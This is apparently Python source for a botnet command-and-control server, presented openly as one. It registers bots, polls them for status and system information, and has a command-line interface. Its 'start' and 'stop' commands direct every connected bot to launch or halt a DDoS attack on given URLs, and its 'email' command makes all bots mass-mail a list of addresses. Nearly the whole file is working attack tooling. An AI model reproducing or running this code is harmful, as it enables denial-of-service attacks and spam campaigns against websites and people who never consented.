import http.client
import requests
import socket
import json
import threading


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host: str, port: int):
        self.__address = (host, port)
        self.__bots = {}
        self.__load_bots()

        self.__cmds = {
            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': False},
            'bots': {'fun': self.__list_bots, 'desc': self.__list_bots.__doc__, 'args': False},
            'info': {'fun': self.__info, 'desc': self.__info.__doc__, 'args': True},
            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': True},
            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
            'email': {'fun': self.__email, 'desc': self.__email.__doc__, 'args': True},
            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': False}
        }
        self.__lock = threading.Lock()  # lock for thread-safe access to attributes

        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.bind(self.__address)
        self.__socket.listen(10)
        self.__socket.settimeout(3)

    def __load_bots(self):
        with open("bots.json", "r") as f:
            bots = json.load(f)

        for addr, port in bots.items():
            try:
                requests.get(f"http://{addr}:{port}/status")
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
                continue
            self.__bots[addr] = port

    def __send_gets(self, path, addresses=None):
        """
        Send get requests for the specified path to the given addresses or to all the bots connected if none is given.
        """
        with self.__lock:
            if not self.__bots:
                return None

            if not addresses:
                addresses = self.__bots.keys()

            responses = {}

            for addr in addresses:
                if addr not in self.__bots.keys():
                    responses[addr] = None
                    continue

                try:
                    responses[addr] = requests.get(f"http://{addr}:{self.__bots[addr]}{path}")
                except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
                    responses[addr] = None
                    self.__bots.pop(addr)
        return responses

    def __bot_connection(self, stop: threading.Event):

        while not stop.is_set():
            try:
                client, address = self.__socket.accept()
            except socket.timeout:
                continue

            address = address[0]

            with self.__lock:
                if address in self.__bots.keys():
                    self.__bots.pop(address)
                else:
                    self.__bots[address] = int(client.recv(1024).decode("utf-8"))
            client.close()
        self.__socket.close()

    def __commands(self) -> str:
        """
        Lists all the commands.
        """
        return "\n\t- " + "\n\t- ".join(f"{cmd}: {self.__cmds[cmd]['desc'].strip()}" for cmd in self.__cmds.keys())

    def __list_bots(self) -> str:
        """
        Lists the bots that are connected to the botnet.
        """
        res = "Bots connected:\n"
        responses = self.__send_gets('/status')

        if responses is None:
            return "No bots connected."

        for addr, resp in responses.items():
            status = json.loads(resp.text)
            res += f"\t- IP:\t{addr}\n\t  Port:\t{self.__bots[addr]}\n\t  Action:\t{status['action']}\n" \
                   f"\t  Targets:\t{status['targets']}\n "
        return res

    def __get_something(self, addresses, path) -> str:
        """
        Get info or status.
        """
        res = ""
        responses = self.__send_gets(path, addresses=addresses)
        if responses is None:
            return "No bots connected."
        for addr, resp in responses.items():
            res += f"\nBot {addr}:\n"

            if resp is not None and resp.status_code == 200:
                for k, v in json.loads(resp.text).items():
                    res += f"\t- {k}: {v}\n"
            else:
                res += "\tBot is not connected.\n"
        return res

    def __status(self, addresses):
        """
        Check the status of a specific bot given his IP addresses.
        """
        return self.__get_something(addresses, "/status")

    def __info(self, addresses):
        """
        Get information about the software and hardware configurations of specific bots given their IP addresses.
        """
        return self.__get_something(addresses, "/info")

    def __start(self, urls):
        """
        Start a DDoS attack to the given  urls.
        """
        with self.__lock:
            if len(self.__bots) == 0:
                return "No bot connected."
            responses = set()
            for url in urls:
                responses.union({
                    requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                    for address, port in self.__bots.items()
                })
        if len(responses) == 1 and responses.pop() != 200:
            return "Attack did not start..."
        return "Attack started successfully!"

    def __stop(self):
        """
        Stop the running DDoS attacks.
        """
        responses = self.__send_gets('/stop')

        if responses is None:
            return "No bot connected."

        codes = {r.status_code for r in responses.values()}

        if len(codes) != 1:
            return "Attack did not stop..."
        code = codes.pop()
        if code == 406:
            return "There isn't any attack running"
        return "Attack stopped successfully!"

    def __email(self, file):
        """
        Makes all the bot connected email every address stored in the given file.
        """
        with self.__lock:
            if len(self.__bots) == 0:
                return "No bot connected."
            with open(file[0], 'r') as f:
                emails = json.load(f)
            with open(file[1], 'r', encoding='utf-8') as f:
                subj, txt = f.read().split('\n\n', 1)

            to_send = {'emails': emails, 'subj': subj, 'txt': txt}
            responses = {
                requests.post(f"http://{address}:{port}/email", json=to_send).status_code
                for address, port in self.__bots.items()
            }
        if len(responses) == 1 and responses.pop() != 200:
            return "Emails were not sent..."
        return "Emails sent successfully!"

    def __exit(self) -> str:
        """
        Close the botnet.
        """
        with self.__lock:
            bots = json.dumps(self.__bots, indent=4)
            with open("bots.json", "w") as f:
                f.write(bots)
        return "Closing program..."

    def cli(self):

        stop = threading.Event()
        bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
        bot_conn.start()
        print("Botnet started...")

        cmd = 0

        while cmd != "exit":
            print("\n('help' to view the commands list).")
            cmd = str.lower(input("\n> "))
            result = self.__run_cmd(cmd)
            print(result)

        stop.set()  # stop the socket thread

    def __run_cmd(self, line):
        try:
            if ' ' in line:
                cmd, args = line.split(' ', 1)
                args = args.split(' ')
                if self.__cmds[cmd]['args']:
                    return self.__cmds[cmd]['fun'](args)
                else:
                    return "Too many arguments."
            else:
                cmd = line
                if self.__cmds[cmd]['args']:
                    return "Too few arguments."
                else:
                    return self.__cmds[cmd]['fun']()
        except KeyError:
            return "Command not recognized."


HOST = '10.0.2.15'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.cli()
